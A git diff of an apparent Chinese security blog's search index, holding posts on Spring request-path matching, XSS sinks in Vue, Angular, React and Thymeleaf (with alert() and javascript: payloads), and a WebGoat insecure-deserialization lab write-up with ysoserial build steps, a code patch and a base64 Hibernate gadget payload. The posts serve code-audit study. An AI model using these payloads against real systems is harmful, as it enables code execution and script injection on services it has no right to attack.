-<p><img src="/2020/08/22/Spring_URL2Controller/getMatchingCondition.png" alt="getMatchingCondition"></p>
-<p>如果其中<code>methods</code>、<code>params</code>、<code>headers</code>、<code>consumes</code>、<code>produces</code>、<code>patterns</code>、<code>custom</code>都匹配，那么可以说这个[映射信息]就匹配成功了。如果未匹配成功，则返回404。</p>
-<ol>
-<li><p>methods : 请求方法匹配（POST/GET/DELETE/PUT等等)，对应RequestMapping注解的method</p>
-</li>
-<li><p>params : 请求参数匹配 例如myParam=myValue，对应RequestMapping注解的params</p>
-</li>
-<li><p>headers : 请求头信息(例如：User-Agent: Mozilla/5.0），对应RequestMapping的headers</p>
-</li>
-<li><p>consumes : 提交内容类型(例如:application/json, text/html;)，对应RequestMapping的consumes</p>
-</li>
-<li><p>produces : 返回的内容类型(例如:application/json)，对应RequestMapping的consumes</p>
-</li>
-<li><p>patterns : URL格式(例如:test/testDo)，对应RequestMapping的value</p>
-</li>
-<li><p>自定义条件</p>
-</li>
-</ol>
-<p>根据以上匹配得到的信息，就能找到对应的Controller。</p>
-<p><code>org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler</code></p>
-<p><img src="/2020/08/22/Spring_URL2Controller/HandlerExecutionChain.png" alt="HandlerExecutionChain"></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Spring中获取请求路径的过程，在<code>org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping</code>中，其流程大概如下图所示。</p>
-<p><img src="/2020/08/22/Spring_URL2Controller/diagram.png" alt="diagram"></p>
-<p>其中比较关键的点是<code>getPathWithinApplication</code>方法，其中对RequestURI的处理有：删除冒号及冒号后的内容，URL解码，去除重复斜杠<code>/</code>（注意是先删除冒号，再URL解码）。</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/hl233211/article/details/77450697" target="_blank" rel="noopener">https://blog.csdn.net/hl233211/article/details/77450697</a></p>
+<p>来源：<a href="https://cn.vuejs.org/v2/guide/syntax.html#%E5%8E%9F%E5%A7%8B-HTML" target="_blank" rel="noopener">https://cn.vuejs.org/v2/guide/syntax.html#原始-HTML</a></p>
+<h1 id="Angular"><a href="#Angular" class="headerlink" title="Angular"></a>Angular</h1><p>Angular同样默认把所有值都当做不可信任的。 当值从模板中以属性（Property）、DOM 元素属性（Attribte)、CSS 类绑定或插值等途径插入到 DOM 中的时候， Angular 将对这些值进行无害化处理（Sanitize），对不可信的值进行编码。</p>
+<p>在低版本（&lt;1.6）的Angular中，存在模版注入的漏洞，用户直接传入<code>49</code>会将<code>7*7</code>插入到Angular的解析之中导致代码执行。</p>
+<p>但前端框架更新速度是非常快的，截止到写文章，目前最新的Angular版本为<code>v9.1.9</code>，及时更新可以一定程度避免框架本身导致的漏洞。</p>
+<p>回到前端开发利用Angular框架回显参数时触发XSS的问题上来。</p>
+<p>和Vue一样，Angular也使用双大括号<code></code>将数据显示在浏览器中，双大括号默认将其中的数据解析为普通文本</p>
+<p>不同的是Angular使用<code>[innerHTML]</code>来表示其中的内容会被浏览器正常解析，不过Angular会识别其中的值，并将其进行无害化处理。</p>
+<p>比如存在以下场景，一处使用<code></code>显示<code>htmlSnippet</code>，另一处使用<code>[innerHTML]=&quot;htmlSnippet&quot;</code>显示<code>htmlSnippet</code></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Binding innerHTML<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Bound value:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"e2e-inner-html-interpolated"</span>&gt;</span>&#123;&#123;htmlSnippet&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Result of binding to innerHTML:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"e2e-inner-html-bound"</span> [<span class="attr">innerHTML</span>]=<span class="string">"htmlSnippet"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当htmlSnippet的内容如下时</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">htmlSnippet = 'Template <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"seikei"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="tag">&lt;<span class="name">b</span>&gt;</span>Syntax<span class="tag">&lt;/<span class="name">b</span>&gt;</span>';</span><br></pre></td></tr></table></figure>
+
+<p>得到的结果如下，最后一行<code>&lt;script&gt;</code>标签不见了，不过它不是被浏览器解析了，而是被Angular自动进行了无害化处理，移除了<code>&lt;script&gt;</code>标签，保留安全的内容，比如片段中的<code>&lt;b&gt;</code>标签。</p>
+<img src="/2020/05/21/XSS-in-front/angular-xss-sanitize.png" alt="angular-xss-sanitize" style="zoom:33%;">
+
+
+
+<p>那万一Angular无害化处理器把业务所需的内容过滤了怎么办呢？</p>
+<p>为了防止这种情况，Angular可以使用以下方法把值标记为可信任的，这样无害化处理器就不会再对该值进行过滤。</p>
+<ul>
+<li><code>bypassSecurityTrustHtml</code></li>
+<li><code>bypassSecurityTrustScript</code></li>
+<li><code>bypassSecurityTrustStyle</code></li>
+<li><code>bypassSecurityTrustUrl</code></li>
+<li><code>bypassSecurityTrustResourceUrl</code></li>
+</ul>
+<p>如下场景</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>An untrusted URL:<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"e2e-dangerous-url"</span> [<span class="attr">href</span>]=<span class="string">"dangerousUrl"</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>A trusted URL:<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"e2e-trusted-url"</span> [<span class="attr">href</span>]=<span class="string">"trustedUrl"</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>dangerousUrl为恶意代码，trustedUrl是经过信任的代码，可以不经过无害化处理器直接解析。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">dangerousUrl = <span class="string">'javascript:alert("Hi seikei")'</span>;</span><br><span class="line">trustedUrl = sanitizer.bypassSecurityTrustUrl(dangerousUrl);</span><br></pre></td></tr></table></figure>
+
+<p>结果是trusted URL会导致XSS产生，而untrusted不会。</p>
+<img src="/2020/05/21/XSS-in-front/angular-xss.png" alt="angular-xss" style="zoom:33%;">
+
+
+
+<blockquote>
+<p><strong>代码审计关键</strong>：注意<code>[innerHTML]</code>、<code>[href]</code>、<code>[src]</code>等，再关注其传入的值是否经过<code>bypassSecurityTrust</code>标记为信任，若值是信任的且用户可控，就可能存在XSS漏洞。</p>
+</blockquote>
+<p>来源：<a href="https://angular.cn/guide/security#xss" target="_blank" rel="noopener">https://angular.cn/guide/security#xss</a></p>
+<h1 id="React"><a href="#React" class="headerlink" title="React"></a>React</h1><p>React使用<code>dangerouslySetInnerHTML</code>作为HTML输入的方法，并且需要向其传递包含 key 为 <code>__html</code> 的对象。只有使用<code>dangerouslySetInnerHTML</code>会存在XSS。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SetHtml</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">	<span class="keyword">constructor</span>()&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">		<span class="keyword">this</span>.state = &#123;</span><br><span class="line">			content:<span class="string">'React XSS Demo &lt;script&gt;alert("seikei")&lt;/script&gt;'</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	render() &#123;</span><br><span class="line">		<span class="keyword">return</span> (</span><br><span class="line">			&lt;div&gt;</span><br><span class="line">				&lt;div&gt;</span><br><span class="line">					&#123;<span class="keyword">this</span>.state.content&#125;</span><br><span class="line">				&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">			&lt;div dangerouslySetInnerHTML=&#123;&#123;__html: this.state.content&#125;&#125; /</span>&gt;</span><br><span class="line"></span><br><span class="line">			&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">		)</span></span><br><span class="line"><span class="regexp">	ß&#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default SetHtml;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p><strong>代码审计关键</strong>：关注<code>dangerouslySetInnerHTML</code>，若用户输入在<code>dangerouslySetInnerHTML</code>中，可能导致XSS。</p>
+</blockquote>
+<p>来源：<a href="https://zh-hans.reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml" target="_blank" rel="noopener">https://zh-hans.reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml</a></p>
+<h1 id="Thymeleaf"><a href="#Thymeleaf" class="headerlink" title="Thymeleaf"></a>Thymeleaf</h1><p>其实thymeleaf算不上前端框架，但是也能控制输入到前端页面的内容。在这里简单记录一下。</p>
+<p>thymeleaf作为模版引擎，可以处理HTML，XML，JavaScript，CSS。thymeleaf有自己的XSS转义方法，thymeleaf模版在对<code>th:text</code>标签进行渲染的时候，默认对特殊字符进行了转义，所以我们输入的XSS payload是在输出时被转义的。</p>
+<p>而<code>th:utext</code>不会将字符转义，这就会导致XSS产生。</p>
+<blockquote>
+<p><strong>代码审计关键</strong>：关注<code>th:utext</code>，<code>th:utext</code>中的内容用户可控则存在XSS。</p>
+</blockquote>
 ]]></content>
   </entry>
   <entry>
@@ -1832,88 +1985,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>前端框架中XSS的代码表现形式</title>
-    <url>/2020/05/21/XSS-in-front/</url>
-    <content><![CDATA[<p>随着前端技术的发展，越来越多的框架默认对XSS做了有效的防范，遵循secure by default原则。</p>
-<p>如果不了解前端框架本身的安全特性，就会导致代码审计过程中对XSS的审计不严密。</p>
-<p>本文是从代码审计的视角去看不同前端框架中可能导致XSS的代码写法。</p>
-<a id="more"></a>
-
-<p>参考：<a href="https://sqreen.github.io/VueXSSDemo/#/" target="_blank" rel="noopener">https://sqreen.github.io/VueXSSDemo/#/</a></p>
-<h1 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h1><p>Vue使用双大括号<code></code>将参数显示在浏览器中，双大括号默认将其中的数据解析为普通文本，而非 HTML 代码，这样避免了XSS的产生。</p>
-<p>其他输出指令也同样会将数据解析为普通文本，比如<code>v-model</code></p>
-<p>当然实际业务中也存在输出HTML代码的需求，若想输出真正的 HTML，就需要使用 <code>v-html</code> 指令</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Using mustaches: &#123;&#123; rawHtml &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Using v-html directive: <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-html</span>=<span class="string">"rawHtml"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>若此时rawHtml为<code>&lt;span style=&quot;color: red&quot;&gt;This should be malicious.&lt;/span&gt;</code>，实际效果如下图：</p>
-<img src="/2020/05/21/XSS-in-front/vue-xss.png" alt="vue-xss" style="zoom:30%;">
-
-
-
-<p><code>v-html</code>的内容会被浏览器当作HTML字符解析，会导致XSS漏洞产生。</p>
-<blockquote>
-<p><strong>代码审计关键</strong>：注意<code>v-html</code>，<code>v-html</code>输出的值若用户可控，就可能存在XSS。</p>
-</blockquote>
-<p>来源：<a href="https://cn.vuejs.org/v2/guide/syntax.html#%E5%8E%9F%E5%A7%8B-HTML" target="_blank" rel="noopener">https://cn.vuejs.org/v2/guide/syntax.html#原始-HTML</a></p>
-<h1 id="Angular"><a href="#Angular" class="headerlink" title="Angular"></a>Angular</h1><p>Angular同样默认把所有值都当做不可信任的。 当值从模板中以属性（Property）、DOM 元素属性（Attribte)、CSS 类绑定或插值等途径插入到 DOM 中的时候， Angular 将对这些值进行无害化处理（Sanitize），对不可信的值进行编码。</p>
-<p>在低版本（&lt;1.6）的Angular中，存在模版注入的漏洞，用户直接传入<code>49</code>会将<code>7*7</code>插入到Angular的解析之中导致代码执行。</p>
-<p>但前端框架更新速度是非常快的，截止到写文章，目前最新的Angular版本为<code>v9.1.9</code>，及时更新可以一定程度避免框架本身导致的漏洞。</p>
-<p>回到前端开发利用Angular框架回显参数时触发XSS的问题上来。</p>
-<p>和Vue一样，Angular也使用双大括号<code></code>将数据显示在浏览器中，双大括号默认将其中的数据解析为普通文本</p>
-<p>不同的是Angular使用<code>[innerHTML]</code>来表示其中的内容会被浏览器正常解析，不过Angular会识别其中的值，并将其进行无害化处理。</p>
-<p>比如存在以下场景，一处使用<code></code>显示<code>htmlSnippet</code>，另一处使用<code>[innerHTML]=&quot;htmlSnippet&quot;</code>显示<code>htmlSnippet</code></p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Binding innerHTML<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Bound value:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"e2e-inner-html-interpolated"</span>&gt;</span>&#123;&#123;htmlSnippet&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Result of binding to innerHTML:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"e2e-inner-html-bound"</span> [<span class="attr">innerHTML</span>]=<span class="string">"htmlSnippet"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>当htmlSnippet的内容如下时</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">htmlSnippet = 'Template <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"seikei"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="tag">&lt;<span class="name">b</span>&gt;</span>Syntax<span class="tag">&lt;/<span class="name">b</span>&gt;</span>';</span><br></pre></td></tr></table></figure>
-
-<p>得到的结果如下，最后一行<code>&lt;script&gt;</code>标签不见了，不过它不是被浏览器解析了，而是被Angular自动进行了无害化处理，移除了<code>&lt;script&gt;</code>标签，保留安全的内容，比如片段中的<code>&lt;b&gt;</code>标签。</p>
-<img src="/2020/05/21/XSS-in-front/angular-xss-sanitize.png" alt="angular-xss-sanitize" style="zoom:33%;">
-
-
-
-<p>那万一Angular无害化处理器把业务所需的内容过滤了怎么办呢？</p>
-<p>为了防止这种情况，Angular可以使用以下方法把值标记为可信任的，这样无害化处理器就不会再对该值进行过滤。</p>
-<ul>
-<li><code>bypassSecurityTrustHtml</code></li>
-<li><code>bypassSecurityTrustScript</code></li>
-<li><code>bypassSecurityTrustStyle</code></li>
-<li><code>bypassSecurityTrustUrl</code></li>
-<li><code>bypassSecurityTrustResourceUrl</code></li>
-</ul>
-<p>如下场景</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>An untrusted URL:<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"e2e-dangerous-url"</span> [<span class="attr">href</span>]=<span class="string">"dangerousUrl"</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>A trusted URL:<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"e2e-trusted-url"</span> [<span class="attr">href</span>]=<span class="string">"trustedUrl"</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>dangerousUrl为恶意代码，trustedUrl是经过信任的代码，可以不经过无害化处理器直接解析。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">dangerousUrl = <span class="string">'javascript:alert("Hi seikei")'</span>;</span><br><span class="line">trustedUrl = sanitizer.bypassSecurityTrustUrl(dangerousUrl);</span><br></pre></td></tr></table></figure>
-
-<p>结果是trusted URL会导致XSS产生，而untrusted不会。</p>
-<img src="/2020/05/21/XSS-in-front/angular-xss.png" alt="angular-xss" style="zoom:33%;">
-
-
-
-<blockquote>
-<p><strong>代码审计关键</strong>：注意<code>[innerHTML]</code>、<code>[href]</code>、<code>[src]</code>等，再关注其传入的值是否经过<code>bypassSecurityTrust</code>标记为信任，若值是信任的且用户可控，就可能存在XSS漏洞。</p>
-</blockquote>
-<p>来源：<a href="https://angular.cn/guide/security#xss" target="_blank" rel="noopener">https://angular.cn/guide/security#xss</a></p>
-<h1 id="React"><a href="#React" class="headerlink" title="React"></a>React</h1><p>React使用<code>dangerouslySetInnerHTML</code>作为HTML输入的方法，并且需要向其传递包含 key 为 <code>__html</code> 的对象。只有使用<code>dangerouslySetInnerHTML</code>会存在XSS。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SetHtml</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">	<span class="keyword">constructor</span>()&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">		<span class="keyword">this</span>.state = &#123;</span><br><span class="line">			content:<span class="string">'React XSS Demo &lt;script&gt;alert("seikei")&lt;/script&gt;'</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	render() &#123;</span><br><span class="line">		<span class="keyword">return</span> (</span><br><span class="line">			&lt;div&gt;</span><br><span class="line">				&lt;div&gt;</span><br><span class="line">					&#123;<span class="keyword">this</span>.state.content&#125;</span><br><span class="line">				&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">			&lt;div dangerouslySetInnerHTML=&#123;&#123;__html: this.state.content&#125;&#125; /</span>&gt;</span><br><span class="line"></span><br><span class="line">			&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">		)</span></span><br><span class="line"><span class="regexp">	ß&#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default SetHtml;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<blockquote>
-<p><strong>代码审计关键</strong>：关注<code>dangerouslySetInnerHTML</code>，若用户输入在<code>dangerouslySetInnerHTML</code>中，可能导致XSS。</p>
-</blockquote>
-<p>来源：<a href="https://zh-hans.reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml" target="_blank" rel="noopener">https://zh-hans.reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml</a></p>
-<h1 id="Thymeleaf"><a href="#Thymeleaf" class="headerlink" title="Thymeleaf"></a>Thymeleaf</h1><p>其实thymeleaf算不上前端框架，但是也能控制输入到前端页面的内容。在这里简单记录一下。</p>
-<p>thymeleaf作为模版引擎，可以处理HTML，XML，JavaScript，CSS。thymeleaf有自己的XSS转义方法，thymeleaf模版在对<code>th:text</code>标签进行渲染的时候，默认对特殊字符进行了转义，所以我们输入的XSS payload是在输出时被转义的。</p>
-<p>而<code>th:utext</code>不会将字符转义，这就会导致XSS产生。</p>
-<blockquote>
-<p><strong>代码审计关键</strong>：关注<code>th:utext</code>，<code>th:utext</code>中的内容用户可控则存在XSS。</p>
-</blockquote>
-]]></content>
-  </entry>
-  <entry>
     <title>iOS 12.4越狱+配置过程记录</title>
     <url>/2020/03/31/iOS-jailbreak/</url>
     <content><![CDATA[<h1 id="越狱"><a href="#越狱" class="headerlink" title="越狱"></a>越狱</h1><p>在 <a href="https://checkra.in/#release" target="_blank" rel="noopener">https://checkra.in/#release</a> 中下载，其中能越狱的设备有iPhone 5s – iPhone X, iOS 12.3 and up</p>
@@ -2030,76 +2101,5 @@
 <p><a href="https://frida.re/docs/ios/" target="_blank" rel="noopener">https://frida.re/docs/ios/</a></p>
 <p><a href="https://github.com/sensepost/objection/wiki/Screenshots" target="_blank" rel="noopener">https://github.com/sensepost/objection/wiki/Screenshots</a></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>WebGoat - 不安全的反序列化</title>
-    <url>/2019/09/28/WebGoat-Deserialization/</url>
-    <content><![CDATA[<p>Webgoat有一道不安全反序列化的题，如下：</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/webgoat-insecure-deserialization.png" alt="webgoat-insecure-deserialization.png"></p>
-<p>最初看到这题有点迷茫，不知道该怎么下手，正是迷茫才能从中学到反序列。从网上找了一些文章，自己也动手完全整了一遍，在此记录。<a id="more"></a>（网上特别详细的文章也没有，所以很多坑都是一步一个脚印踩上去的）</p>
-<p>最早的一篇讲解Webgoat反序列化的文章</p>
-<p><a href="https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef" target="_blank" rel="noopener">https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef</a></p>
-<p>上一篇文章的中文翻译，其中有部分作者的改动</p>
-<p><a href="https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/" target="_blank" rel="noopener">https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/</a></p>
-<p>另一篇文章</p>
-<p><a href="https://www.jianshu.com/p/0c45058e1723" target="_blank" rel="noopener">https://www.jianshu.com/p/0c45058e1723</a></p>
-<h2 id="正文开始"><a href="#正文开始" class="headerlink" title="正文开始"></a>正文开始</h2><p>安装Burp插件Java Deserialization Scanner，被动扫描发现存在不安全反序列化漏洞</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-detect.png" alt="deserialization-detect"></p>
-<p>将请求Send request to DS - Manual testing 进行测试，发现存在Hibernate 5类型的反序列化</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-manual-testing.png" alt="deserialization-manual-testing"></p>
-<p>然后将请求Send request to DS - Exploitation</p>
-<p>坑点一：使用原始的ysoserial.jar执行会报错，需要重新编译ysoserial</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting.png" alt="deserialization-exploiting"></p>
-<p>详细报错信息如下所示</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-error.png" alt="deserialization-error"></p>
-<p>在GitHub项目里下载源码，无需修改（因为源码里面已经添加了，但是作者并没有将它打包放在releases里）。GitHub地址：<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
-<p><code>mvn clean package -DskipTests -Dhibernate5</code>即可构建代码（亲测不加-Dhibernate5不行)</p>
-<p>在插件中配置好构建完成的jar包路径，即可正常执行反序列化payload。</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting-2.png" alt="deserialization-exploiting-2"></p>
-<p>坑点二：Mac下该Java 版本执行ysoserial.jar会提示</p>
-<blockquote>
-<p>com.nqzero.permit.Permit$InitializationFailed: initialization failed, perhaps you’re running with a security manager</p>
-</blockquote>
-<p><img src="/2019/09/28/WebGoat-Deserialization/java-version.png" alt="java-version"></p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/ysoserial-hibernate-error.png" alt="ysoserial-hibernate-error"></p>
-<p>需要在pom.xml中将nqzero版本改为0.4（原始为0.3），重新使用maven构建即可使用。</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/nqzero.png" alt="nqzero.png"></p>
-<p>最开始碰到这个问题还以为在Mac下或者是Java版本太高不能用了，于是在Windows下执行，但是Windows执行后不能立马进行base64，还需要将ysoserial的输出保存在文件中，再将文件内容base64编码，觉得太麻烦。这个问题在谷歌中查也查不到解决办法。</p>
-<p>在IntelliJ IDEA中查看pom.xml文件时发现存在com.nqzero这个包，报错信息也是com.nqzero.permit.Permit$InitializationFailed，于是想着会不会是这个包版本不对，在maven库中一查，果然最新是0.4版本的，于是换成0.4后使用maven构建后可正常使用。</p>
-<p>构建时发现Java版本为1.6，我的maven没法构建，将Java版本改为1.7或者1.8即可正常构建。</p>
-<p>坑点三：在Linux中，ysoserial的反序列化无法使用sleep命令，其他命令能执行，这不知道为什么，但是在其他人文章中发现windows下的sleep能执行。目前没有发现任何解决办法，这个稍后动态调试一下看看到底是什么问题导致的。</p>
-<p><em>PS：但是Deserialization Scanner中的payload是sleep十秒的，目前不清楚是怎么实现的。</em></p>
-<p><strong>请求在执行sleep后并未等待命令结束就已经返回结果</strong>，若要等待进程结束后返回，需要针对ysoserial的执行命令进行调整，重新生成payload进行测试。</p>
-<p>在ysoserial/payloads/util/Gadgets.java:117-119，将代码做以下修改，可实现sleep等待5秒</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">String cmd = <span class="string">"java.lang.Process p=java.lang.Runtime.getRuntime().exec(\\"</span><span class="string">" +</span></span><br><span class="line"><span class="string">            command.replaceAll("</span>\\\\\\\\",<span class="string">"\\\\\\\\\\\\\\\\"</span>).replaceAll(<span class="string">"\\"</span><span class="string">", "</span>\\\\\\"<span class="string">") +</span></span><br><span class="line"><span class="string">            "</span>\\");p.waitFor();<span class="string">";</span></span><br></pre></td></tr></table></figure>
-
-<p>最终效果图如下：</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting-success.png" alt="deserialization-exploiting-success"></p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/webgoat-insecure-deserialization-complete.png" alt="webgoat-insecure-deserialization-complete"></p>
-<p>payload也贴一下吧</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS